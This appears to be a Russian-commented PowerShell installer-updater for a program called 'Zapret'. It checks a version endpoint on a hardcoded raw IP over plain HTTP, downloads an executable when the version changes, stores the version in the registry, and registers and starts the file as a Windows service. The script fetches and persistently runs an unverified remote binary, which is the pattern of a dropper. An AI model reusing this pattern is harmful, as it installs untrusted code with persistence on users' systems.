# === Настройки ===
$server = "http://5.158.121.185:4200/api"
$versionUrl = "$server/version"
$downloadUrl = "$server/download"
$regPath = "HKCU:\Software\Zapret"
$regKey = "version"
$savePath = "$env:LOCALAPPDATA\Zapret\zapret.exe"
$serviceName = "ZapretService"

# === Создание папки если нет ===
if (!(Test-Path -Path (Split-Path $savePath))) {
    New-Item -ItemType Directory -Force -Path (Split-Path $savePath) | Out-Null
}

# === Получить текущую версию из реестра ===
$currentVersion = ""
if (Test-Path $regPath) {
    try {
        $currentVersion = Get-ItemProperty -Path $regPath -Name $regKey -ErrorAction SilentlyContinue | Select-Object -ExpandProperty $regKey
    } catch {}
}

# === Получить версию с сервера ===
try {
    $remoteVersion = Invoke-RestMethod -Uri $versionUrl -UseBasicParsing
} catch {
    Write-Host "Не удалось получить версию с сервера: $_"
    exit
}

# === Проверить, нужна ли загрузка ===
$needUpdate = $false

if ([string]::IsNullOrEmpty($currentVersion)) {
    $needUpdate = $true
} elseif ($remoteVersion -ne $currentVersion) {
    $needUpdate = $true
}

# === Скачивание и установка, если нужно ===
if ($needUpdate) {
    try {
        Write-Host "Скачиваем файл..."
        Invoke-WebRequest -Uri $downloadUrl -OutFile $savePath -UseBasicParsing
        Write-Host "Файл сохранён в $savePath"
    } catch {
        Write-Host "Ошибка при скачивании: $_"
        exit
    }

    # === Установка версии в реестр ===
    if (!(Test-Path $regPath)) {
        New-Item -Path $regPath -Force | Out-Null
    }
    Set-ItemProperty -Path $regPath -Name $regKey -Value $remoteVersion
}

# === Создание сервиса через SC (если не существует) ===
$existingService = sc.exe query $serviceName 2>&1 | Select-String "does not exist"
if ($existingService) {
    Write-Host "Создаём сервис $serviceName"
    sc.exe create $serviceName binPath= "`"$savePath`"" start= delayed-auto
    sc.exe description $serviceName "Запретный сервис"
} else {
    Write-Host "Сервис $serviceName уже существует"
}

# === Запуск сервиса ===
sc.exe start $serviceName
